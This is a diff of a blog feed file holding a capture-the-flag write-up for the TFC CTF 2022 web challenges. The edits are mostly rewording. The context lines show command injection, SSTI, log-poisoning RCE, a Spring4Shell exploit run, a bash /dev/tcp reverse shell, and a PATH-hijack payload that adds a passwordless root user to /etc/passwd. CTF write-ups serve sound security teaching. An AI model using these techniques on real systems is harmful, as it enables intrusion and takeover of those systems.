@@ -12,7 +12,7 @@
         <pubDate>Mon, 01 Aug 2022 00:00:00 +0000</pubDate>
         
         <guid>https://g0tfl4g.github.io/p/tfc-ctf-2022/</guid>
-        <description>&lt;img src="https://g0tfl4g.github.io/p/tfc-ctf-2022/img/tfc.svg" alt="Featured image of post TFC CTF 2022" /&gt;&lt;p&gt;Participated in TFC CTF 2022 with my team CyberSpace. I only played Web and solved all web challenges (8/8).&lt;/p&gt;
+        <description>&lt;img src="https://g0tfl4g.github.io/p/tfc-ctf-2022/img/tfc.svg" alt="Featured image of post TFC CTF 2022" /&gt;&lt;p&gt;Played TFC CTF 2022 with my team CyberSpace. I only played Web and solved all Web challenges (8/8).&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/cyberspace.png&#34;
 	width=&#34;812&#34;
 	height=&#34;285&#34;
@@ -27,7 +27,7 @@
 &lt;/p&gt;
 &lt;h2 id=&#34;robots-and-music&#34;&gt;ROBOTS AND MUSIC&lt;/h2&gt;
 &lt;p&gt;Web | WarmUp&lt;/p&gt;
-&lt;p&gt;From the &lt;code&gt;robots.txt&lt;/code&gt;, we can get the hidden endpoint &lt;code&gt;/g00d_old_mus1c.php&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;From the &lt;code&gt;robots.txt&lt;/code&gt;, I can get the hidden endpoint &lt;code&gt;/g00d_old_mus1c.php&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/ram_flag.png&#34;
 	width=&#34;724&#34;
 	height=&#34;200&#34;
@@ -42,7 +42,7 @@
 &lt;/p&gt;
 &lt;h2 id=&#34;pong&#34;&gt;PONG&lt;/h2&gt;
 &lt;p&gt;Web | WarmUp&lt;/p&gt;
-&lt;p&gt;This challenge is about &lt;code&gt;Command Injection&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;This challenge is about &lt;code&gt;OS Command Injection&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/pong_1.png&#34;
 	width=&#34;753&#34;
 	height=&#34;94&#34;
@@ -55,7 +55,7 @@
 	
 &gt;
 &lt;/p&gt;
-&lt;p&gt;Using &lt;code&gt;|&lt;/code&gt; (pipe), we can inject the command as shown below.&lt;/p&gt;
+&lt;p&gt;Using &lt;code&gt;|&lt;/code&gt;, I can inject the commands as shown below and get the flag.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/pong_2.png&#34;
 	width=&#34;570&#34;
 	height=&#34;105&#34;
@@ -80,7 +80,6 @@
 	
 &gt;
 &lt;/p&gt;
-&lt;p&gt;And we can get the flag&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/pong_flag.png&#34;
 	width=&#34;604&#34;
 	height=&#34;124&#34;
@@ -95,8 +94,8 @@
 &lt;/p&gt;
 &lt;h2 id=&#34;are-you-the-admin&#34;&gt;ARE YOU THE ADMIN?&lt;/h2&gt;
 &lt;p&gt;Web | Easy&lt;/p&gt;
-&lt;p&gt;For this challenge, they provided us the source code, &lt;code&gt;index.tsx, auth.ts and schema prisma&lt;/code&gt;, but I didn&amp;rsquo;t need them to solve this one.&lt;/p&gt;
-&lt;p&gt;We just need to add the extra parameter, &lt;code&gt;isAdmin&lt;/code&gt;, in the JSON body when creating the account.&lt;/p&gt;
+&lt;p&gt;For this challenge, they provided the source files, &lt;code&gt;index.tsx, auth.ts and schema.prisma&lt;/code&gt;, but I didn&amp;rsquo;t need them actually.&lt;/p&gt;
+&lt;p&gt;I just need to add the extra parameter, &lt;code&gt;isAdmin&lt;/code&gt;, in the JSON body when creating the account.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/ayta_4.png&#34;
 	width=&#34;700&#34;
 	height=&#34;138&#34;
@@ -138,7 +137,7 @@
 &lt;/p&gt;
 &lt;h2 id=&#34;calendar&#34;&gt;CALENDAR&lt;/h2&gt;
 &lt;p&gt;Web | Medium&lt;/p&gt;
-&lt;p&gt;From the website, we can find out that the application is using a vulnerable version of modern-event-calendar-lite wordpress plugin.&lt;/p&gt;
+&lt;p&gt;From the website, I can find out that the application is using a vulnerable version of the modern-event-calendar-lite WordPress plugin.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -167,7 +166,7 @@
 	
 &gt;
 &lt;/p&gt;
-&lt;p&gt;The exploit code can be found from the Exploit-DB (&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/50084&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;p&gt;The exploit script can be found here (&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/50084&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Wordpress Plugin Modern Events Calendar 5.16.2 - Event export&lt;/a&gt;)&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/calendar_2.png&#34;
 	width=&#34;799&#34;
@@ -183,7 +182,7 @@
 &lt;/p&gt;
 &lt;h2 id=&#34;diamonds&#34;&gt;DIAMONDS&lt;/h2&gt;
 &lt;p&gt;Web | Medium&lt;/p&gt;
-&lt;p&gt;This challenge is about Ruby Regex Bypassing + SSTI.&lt;/p&gt;
+&lt;p&gt;This challenge is about &lt;code&gt;Ruby Regex Bypassing + SSTI&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/diamonds_1.png&#34;
 	width=&#34;678&#34;
 	height=&#34;160&#34;
@@ -196,7 +195,7 @@
 	
 &gt;
 &lt;/p&gt;
-&lt;p&gt;If we attempt to submit characters such as &lt;code&gt;Å&lt;/code&gt; (%c5), we can get the debug page due to &lt;code&gt;Invalid Byte Sequence in UTF-8&lt;/code&gt; error and also the part of the source code.&lt;/p&gt;
+&lt;p&gt;If we submit characters such as &lt;code&gt;Å&lt;/code&gt; (%c5), we can get the debug page and also the part of the source code due to &lt;code&gt;Invalid Byte Sequence in UTF-8&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/diamonds_3.png&#34;
 	width=&#34;914&#34;
 	height=&#34;686&#34;
@@ -219,7 +218,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;vi&#34;&gt;@input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ERB&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;params&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;:input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;binding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;It seems like there is no issue but in Ruby the &lt;code&gt;^&lt;/code&gt; and &lt;code&gt;$&lt;/code&gt; match at the start and end of each line. Therefore if any line matches the regex, we can bypass it.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;It seems like there is no issue in the Regex but in Ruby the &lt;code&gt;^&lt;/code&gt; and &lt;code&gt;$&lt;/code&gt; match at the start and end of each line. Therefore if any line matches the regex, we can bypass it.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -283,7 +282,7 @@
 	
 &gt;
 &lt;/p&gt;
-&lt;p&gt;I tried to read the &lt;code&gt;flag.txt&lt;/code&gt; but didn&amp;rsquo;t work. As we already have LFI, we can try RCE via Log Poisoning.&lt;/p&gt;
+&lt;p&gt;Tried to read the &lt;code&gt;flag.txt&lt;/code&gt; but didn&amp;rsquo;t work. As we already have LFI, we can try RCE via Log Poisoning.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -306,7 +305,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Upgrade-Insecure-Requests: 1
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Now we just need to check the log file via LFI and execute our commands.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;After poisoning the log file, we just need to check the log file via LFI and execute our commands.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -331,7 +330,7 @@
 &lt;/p&gt;
 &lt;h2 id=&#34;tubeinc&#34;&gt;TUBEINC&lt;/h2&gt;
 &lt;p&gt;Web | Hard&lt;/p&gt;
-&lt;p&gt;We have to get 2 flags, user and root, to complete this challenge.&lt;/p&gt;
+&lt;p&gt;I need to get 2 flags, user.flag and root.flag, to complete this challenge.&lt;/p&gt;
 &lt;p&gt;From the website footer, we can get the following information.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -362,7 +361,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;34.65.33.171 legacy.tube.com
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Again from the bottom of the page, we can get the important information.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Again from the bottom of the page, I can get the important information.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -383,7 +382,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;  --&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;The &lt;code&gt;/info&lt;/code&gt; page tells us that the website is using a compromised &amp;ldquo;Spring-Boot&amp;rdquo; framework. Yeaahhhh we all can assume that this is about &lt;code&gt;Spring4Shell&lt;/code&gt; vulnerability.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;The &lt;code&gt;/info&lt;/code&gt; page tells us that the website is using a compromised &amp;ldquo;Spring-Boot&amp;rdquo; framework. I think this is about &lt;code&gt;Spring4Shell&lt;/code&gt; vulnerability.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/tube_1.png&#34;
 	width=&#34;814&#34;
 	height=&#34;127&#34;
@@ -407,7 +406,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 spring4shell.py http://legacy.tube.com:52524
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Now we can get the user flag from the &lt;code&gt;/home/user.flag&lt;/code&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Run the script and we can get the user flag from the &lt;code&gt;/home/user.flag&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://g0tfl4g.github.io/p/tfc-ctf-2022/img/tube_3.png&#34;
 	width=&#34;810&#34;
 	height=&#34;59&#34;
@@ -452,7 +451,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/myip/port 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Now run the exploit, send request with the url parameter, and get the reverse shell :)&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Send a request with the url parameter, and get the reverse shell :)&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -487,19 +486,21 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* * * * * root apt update &amp;gt;&amp;gt; /var/log/cron.log
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;The &lt;code&gt;PATH&lt;/code&gt; includes the global writeable directory &lt;code&gt;/var/tmp&lt;/code&gt;. That means we can create our own malicious &lt;code&gt;apt&lt;/code&gt; file and put it in the &lt;code&gt;/var/tmp&lt;/code&gt; direcotry to make the cronjob executes our &lt;code&gt;apt&lt;/code&gt; file not the original &lt;code&gt;apt&lt;/code&gt;.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;The &lt;code&gt;PATH&lt;/code&gt; includes the global writeable directory &lt;code&gt;/var/tmp&lt;/code&gt;. That means we can create our malicious &lt;code&gt;apt&lt;/code&gt; file and put it in the &lt;code&gt;/var/tmp&lt;/code&gt; direcotry to make the cronjob executes our &lt;code&gt;apt&lt;/code&gt; file not the original &lt;code&gt;apt&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;apt&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;imgroot::0:0:root:/root:/bin/bash” &amp;gt;&amp;gt; /etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# This will add the new root user without password&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;imgroot::0:0:root:/root:/bin/bash” &amp;gt;&amp;gt; /etc/passwd
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Now we just need to get the root flag!!!!&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;We just need to get the root flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
